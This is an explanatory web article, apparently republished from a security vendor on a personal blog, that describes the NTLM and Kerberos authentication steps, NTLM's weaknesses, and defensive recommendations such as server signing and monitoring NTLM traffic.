<p><strong>NTLM authentication</strong> typically follows the following step-by-step process:</p>
<p>The user shares their username, password and domain name with the client.</p>
<p>The client develops a scrambled version of the password — or hash — and deletes the full password.</p>
<p>The client passes a plain text version of the username to the relevant server.</p>
<p>The server replies to the client with a challenge, which is a 16-byte random number.</p>
<p>In response, the client sends the challenge encrypted by the hash of the user’s password.</p>
<p>The server then sends the challenge, response and username to the domain controller (DC).</p>
<p>The DC retrieves the user’s password from the database and uses it to encrypt the challenge.</p>
<p>The DC then compares the encrypted challenge and client response. If these two pieces match, then the user is authenticated and access is granted.</p>
<h2 id="the-difference-between-ntlm-and-kerberos"><strong>The Difference Between NTLM and Kerberos?</strong></h2>
<p>Like NTLM, <strong>Kerberos</strong> is an authentication protocol. It replaced NTLM as the default/standard authentication tool on Windows 2000 and later releases.</p>
<p>The main difference between NTLM and Kerberos is in how the two protocols manage authentication. NTLM relies on a three-way handshake between the client and server to authenticate a user. Kerberos uses a two-part process that leverages a ticket granting service or key distribution center.</p>
<p>Another main difference is whether passwords are hashed or encrypted. NTLM relies on <strong>password hashing</strong>, which is a one-way function that produces a string of text based on an input file; Kerberos leverages <strong>encryption</strong>, which is a two-way function that scrambles and unlocks information using an encryption key and decryption key respectively.</p>
<p>Even though the Kerberos protocol is Microsoft’s default authentication method today, NTLM serves as a backup. If Kerberos fails to authenticate the user, the system will attempt to use NTLM instead.</p>
<h3 id="why-was-ntlm-replaced-by-kerberos"><strong>Why Was NTLM Replaced by Kerberos?</strong></h3>
<p>NTLM was subject to several known security vulnerabilities related to password hashing and salting.</p>
<p>In NTLM, passwords stored on the server and domain controller are not “<strong>salted</strong>” — meaning that a random string of characters is not added to the hashed password to further protect it from cracking techniques. This means that adversaries who possess a password hash do not need the underlying password to authenticate a session. As a result, systems were vulnerable to <strong>brute force attacks</strong>, which is when an attacker attempts to crack a password through multiple log-in attempts. If the user selects a weak or common password, they are especially susceptible to such tactics.</p>
<p>NTLM’s cryptography also fails to take advantage of new advances in algorithms and encryption that significantly enhance security capabilities.</p>
<h3 id="kerberos-protocol"><strong>Kerberos Protocol</strong></h3>
<p>Kerberos was developed by researchers at the Massachusetts Institute of Technology (MIT) in the 1980s. The name is derived from the Greek mythological character Kerberos, the three-headed dog who guards the underworld.</p>
<p>In practice, the three security components in the Kerberos protocol are represented as:</p>
<p>A client seeking authentication</p>
<p>A server the client wants to access</p>
<p>The ticketing service or key distribution center (KDC)</p>
<h3 id="kerberos-authentication"><strong>Kerberos Authentication</strong></h3>
<p>Here is the twelve-step process for Kerberos authentication:</p>
<p>The user shares their username, password, and domain name with the client.</p>
<p>The client assembles a package — or an authenticator — which contains all relevant information about the client, including the user name, date and time. All information contained in the authenticator, aside from the user name, is encrypted with the user’s password.</p>
<p>The client sends the encrypted authenticator to the KDC.</p>
<p>The KDC checks the user name to establish the identity of the client. The KDC then checks the AD database for the user’s password. It then attempts to decrypt the authenticator with the password. If the KDC is able to decrypt the authenticator, the identity of the client is verified.</p>
<p>Once the identity of the client is verified, the KDC creates a ticket or session key, which is also encrypted and sent to the client.</p>
<p>The ticket or session key is stored in the client’s Kerberos tray; the ticket can be used to access the server for a set time period, which is typically 8 hours.</p>
<p>If the client needs to access another server, it sends the original ticket to the KDC along with a request to access the new resource.</p>
<p>The KDC decrypts the ticket with its key. (The client does not need to authenticate the user because the KDC can use the ticket to verify that the user’s identity has been confirmed previously).</p>
<p>The KDC generates an updated ticket or session key for the client to access the new shared resource. This ticket is also encrypted by the server’s key. The KDC then sends this ticket to the client.</p>
<p>The client saves this new session key in its Kerberos tray, and sends a copy to the server.</p>
<p>The server uses its own password to decrypt the ticket.</p>
<p>If the server successfully decrypts the session key, then the ticket is legitimate. The server will then open the ticket and review the access control list (ACL) to determine if the client has the necessary permission to access the resource.</p>
<h2 id="applications-that-use-ntlm"><strong>Applications That Use NTLM</strong></h2>
<p>NTLM was replaced as the default authentication protocol in Windows 2000 by Kerberos. However, NTLM is still maintained in all Windows systems for compatibility purposes between older clients and servers.</p>
<p>For example, computers still running Windows 95, Windows 98, or Windows NT 4.0 will use the NTLM protocol for network authentication with a Windows 2000 domain. Meanwhile, computers running Windows 2000 will use NTLM when authenticating servers with Windows NT 4.0 or earlier, as well as when accessing resources in Windows 2000 or earlier domains. NTLM is also used to authenticate local logons with non-domain controllers.</p>
<h2 id="ntlm-benefits-and-challenges"><strong>NTLM Benefits and Challenges</strong></h2>
<p>NTLM is considered an outdated protocol. As such, its benefits — when compared to a more modern solution, such as Kerberos — are limited. Yet the original promise of NTLM remains true: Clients use password hashing to avoid sending unprotected passwords over the network.</p>
<p>At this point there are several clear disadvantages to relying on NTLM authentication:</p>
<ul>
<li>
<p><strong>Single authentication.</strong> NTLM is a single authentication method. It relies on a challenge-response protocol to establish the user. It does not support <a href="https://www.crowdstrike.com/cybersecurity-101/multifactor-authentication-mfa/">multifactor authentication</a> (MFA), which is the process of using two or more pieces of information to confirm the identity of the user.</p>
</li>
<li>
<p><strong>Security vulnerabilities.</strong> The relatively simplistic form of password hashing makes NTLM systems vulnerable to several modes of attacks, including <a href="https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/">pass-the-hash</a> and <a href="https://www.crowdstrike.com/cybersecurity-101/brute-force-attacks/">brute-force attacks</a>.</p>
</li>
<li>
<p><strong>Outdated cryptography.</strong> NTLM does not leverage the latest advances in algorithmic thinking or encryption to make passwords more secure.</p>
</li>
</ul>
<h3 id="how-can-you-protect-your-network-using-ntlm"><strong>How Can You Protect Your Network Using NTLM?</strong></h3>
<p>Given the known security risks associated with NTLM, CrowdStrike recommends that organizations try to reduce NTLM usage in their network as much as possible.</p>
<p>For organizations still relying on NTLM for compatibility reasons, CrowdStrike offers the following recommendations to enhance security and minimize risk.</p>
<p><strong>Enforce NTLM mitigations.</strong> To be fully protected from NTLM relay attacks, you will need to enable server signing and EPA on all relevant servers.</p>
<p><strong>Patch!</strong> Make sure your systems are fully protected with the latest security updates from Microsoft.</p>
<p><strong>Use advanced techniques.</strong> Apply advanced NTLM relay detection and prevention techniques similar to the ones disclosed by Preempt (now CrowdStrike) in our Black Hat 2019 talk.</p>
<p><strong>Identify weak variations.</strong> Some NTLM clients use weak NTLM variations (e.g., don’t send a MIC). This puts your network at a greater risk of being vulnerable to NTLM relay.</p>
<p><strong>Monitor NTLM traffic in your network.</strong> Try to restrict insecure NTLM traffic.</p>
<p>Get rid of clients sending LM responses and set the Group Policy Object (GPO) network security: LAN Manager authentication level to refuse LM responses. <a href="#user-content-fnref-8" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a></p>
</li>
</ol>
</section>
    </div>
  </section><hr>
<script src="https://giscus.app/client.js" data-repo="versun/Tiny-Website-by-Astro" data-repo-id="R_kgDOH8gn5w" data-category="Announcements" data-category-id="DIC_kwDOH8gn584CRQOD" data-mapping="title" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="light_high_contrast" data-lang="en" crossorigin="anonymous" async>
</script><footer class="container has-text-centered mt-6">
  <span>
    -<strong> 2022 · <a href="https://versun.me">Versun</a> · <a href="https://versun.me/rss.xml">rss</a></strong> -
    <br>
    Source code licensed <a href="https://mit-license.org/" target="_blank">MIT.</a>
    Website content licensed <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a>
    <br>
    <p>Last Update: 2022/12/17
</p>
  </span>
  <div style="color: transparent">
    This is a honeypot:
    <a href="mailto:2j9BV8WX3@versun.me" style="color: transparent">
      2j9BV8WX3@versun.me
    </a>
    Please do not use it unless you are a spambot.
  </div>
</footer>
	</body></html>